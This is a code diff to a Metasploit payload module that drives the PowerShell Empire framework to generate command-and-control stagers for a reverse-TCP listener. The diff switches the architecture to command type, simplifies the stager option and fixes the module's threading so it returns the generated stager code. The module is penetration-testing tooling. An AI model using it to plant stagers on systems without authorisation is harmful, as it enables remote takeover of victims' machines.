@@ -22,7 +22,7 @@ module MetasploitModule
     'Author'     => ['author_name'],
     'License'    => MSF_LICENSE,
     'Platform'   => ['Windows', 'Linux', 'MacOS'],
-    'Arch'       => ARCH_X64,
+    'Arch'       => ARCH_CMD,
     'Handler'    => Msf::Handler::EmpireReverseTcp
     ))
     register_options(
@@ -41,11 +41,10 @@ module MetasploitModule
         [true,
         'The empire listener name that would listen for the created stager on the local system',
         ]),
-      OptEnum.new(
+      OptString.new(
         'StagerType',
         [true,
-        'The type of stager to be generated',
-        enums: ['windows/dll', 'windows/ducky', 'windows/launcher_sct', 'windows/laucher_vbs', 'windows/launcher_xml', 'windows/teensy', 'windows/launcher_bat', 'windows/launcher_lnk', 'windows/macro' ]]),
+        'The type of stager to be generated','windows/launcher']),
       OptString.new(
         'PathToEmpire',
         [true,
@@ -63,6 +62,7 @@ module MetasploitModule
     @listener_name = datastore['ListenerName'].to_s
     @stager_type = datastore['StagerType'].to_s
     @path = datastore['PathToEmpire'].to_s.chomp
+    @stagerCode = ''
     Dir.chdir(@path)
     def thread_API
       #
@@ -83,7 +83,7 @@ module MetasploitModule
         return "Empire-API not yet active"
       end
       #Assign proper time interval so that the API can initiate
-      sleep()
+      sleep(8)
       #Creating an Empire object
       client_emp = Msf::Empire::Client.new('empire-msf','empire-msf')
       #Checking listener status
@@ -98,11 +98,9 @@ module MetasploitModule
 
       #Generating payload
       if @stager_type == "windows/dll"
-        stagerCode = client_emp.generate_dll(@listener_name, 'x86',@path)
-        return stagerCode
+        @stagerCode = client_emp.generate_dll(@listener_name, 'x86',@path)
       else
-        stagerCode = client_emp.gen_stager(@listener_name, @stager_type)
-        return stagerCode
+        @stagerCode = client_emp.gen_stager(@listener_name, @stager_type)
       end
     end
 
@@ -112,10 +110,8 @@ module MetasploitModule
     }
     thread_main = Thread.new{
       main()
-    }
-
-    #Joining the main thread
-    thread_main.join
+    }.join
+    return @stagerCode
   end
 end
 
